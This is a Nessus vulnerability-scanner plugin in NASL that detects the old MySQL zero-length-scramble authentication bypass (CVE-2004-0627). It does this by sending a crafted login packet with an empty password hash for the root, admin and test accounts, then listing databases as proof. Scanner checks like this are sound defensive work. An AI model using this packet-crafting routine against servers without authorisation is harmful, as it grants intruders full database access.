#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(17690);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2016/11/18 19:03:16 $");

  script_cve_id("CVE-2004-0627");
  script_bugtraq_id(10654);
  script_osvdb_id(7475);
  script_xref(name:"CERT", value:"184030");
  script_xref(name:"EDB-ID", value:"311");

  script_name(english:"MySQL Zero-length Scrambled String Crafted Packet Authentication Bypass");
  script_summary(english:"Tries to bypass authentication with a zero length password");

  script_set_attribute(
    attribute:"synopsis",
    value:
"It is possible to bypass authentication on the remote database
service."
  );
  script_set_attribute(
    attribute:"description", 
    value:
"A bug in the version of MySQL running on the remote host allows a
remote attacker to bypass the password authentication mechanism using
a specially crafted packet with a zero-length scramble buff string. 

An attacker with knowledge of an existing account defined to the
affected service can leverage this vulnerability to bypass
authentication and gain full access to that account."
  );

  script_set_attribute(
    attribute:"see_also", 
    value:"http://seclists.org/bugtraq/2004/Jul/45"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://dev.mysql.com/doc/refman/4.1/en/news-4-1-3.html"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Upgrade to MySQL 4.1.3 or later."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

  script_set_attribute(attribute:"vuln_publication_date", value:"2004/07/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2004/06/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/01/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mysql:mysql");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();
 
  script_category(ACT_ATTACK);
  script_family(english:"Databases");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl");
  script_require_ports("Services/mysql", 3306);
  script_exclude_keys("global_settings/supplied_logins_only");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("mysql_func.inc");


port = get_service(svc:"mysql", default:3306, exit_on_fail:TRUE);

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);


# nb: Exploitation requires a valid user account.
accts = make_list("root");
if (thorough_tests) accts = make_list(accts, "admin", "test");


# Try to bypass authentication.
foreach acct (accts)
{
  mysql_init(port:port, nocache:TRUE, exit_on_fail:TRUE);

  # Send a malicious client authentication packet.
  flags = mysql_get_caps() | 
         CLIENT_SECURE_CONNECTION | 
       CLIENT_PROTOCOL_41;
  flags = flags & 
         ~CLIENT_CONNECT_WITH_DB & 
         ~CLIENT_SSL &
         ~CLIENT_COMPRESS;

  # nb: we can't use 'mysql_login()' because the exploit involves a
  #     specially crafted scramble_buff.
  cap = mkdword(flags) +                           # capabilities
    mkdword(0xffff) +                              # max packet size
    mkbyte(mysql_get_lang()) +                     # charset
    crap(data:mkbyte(0), length:23) +              # filler
    acct + mkbyte(0) +                             # username plus null byte
    mkbyte(20) + crap(data:mkbyte(0), length:20);  # scramble_buff -- look ma, no password!

  mysql_send_packet(data:cap);
  pkt = mysql_recv_packet();

  # nb: if the user doesn't exist, we should get an 
  #     "Access denied" error message.
  if (
    isnull(pkt) || 
    mysql_is_error_packet(packet:pkt) ||
    # nb: EOF packet is also an error.
    getbyte(blob:pkt["data"], pos:0) == 0xfe
  )
  {
    mysql_close();
    continue;
  }

  # At this point we're in, but get a list of databases for the plugin output.
  info = '';

  mysql_send_packet(data:mkbyte(3)+'show databases', num:0);
  pkt = mysql_recv_packet();

  if (!isnull(pkt) && pkt['num'] == 1)
  {
    pkt = mysql_recv_packet();
    if (!isnull(pkt))
    {
      pkt = mysql_recv_packet();
      if (!isnull(pkt) && getbyte(blob:pkt['data'], pos:0) == 254)
      {
        loop = TRUE;
        while (loop)
        {
          pkt = mysql_recv_packet();
          if (!isnull(pkt) && getbyte(blob:pkt['data'], pos:0) != 254)
            info += '\n  - ' + substr(pkt['data'], 1, pkt['len']-1);
          else loop = FALSE;
        }
      }
    }
  }

  if (info && report_verbosity > 0)
  {
    report += '\n' + 'Nessus was able to exploit the vulnerability to connect as \'' + acct + '\', and' +
              '\n' + 'retrieve the following list of databases from the remote server :' +
              '\n' +
              info + '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);

  mysql_close();
  exit(0);
}


# Report that the service wasn't affected given the accounts we checked.
if (max_index(accts) == 1) reason = 'a check of the account \'' + join(accts, sep:"' and '") + '\'.';
else reason = 'checks of the accounts \'' + join(accts, sep:"', '") + '\'.';

exit(0, 'The MySQL server on port '+port+' does not seem to be affected based on '+reason);
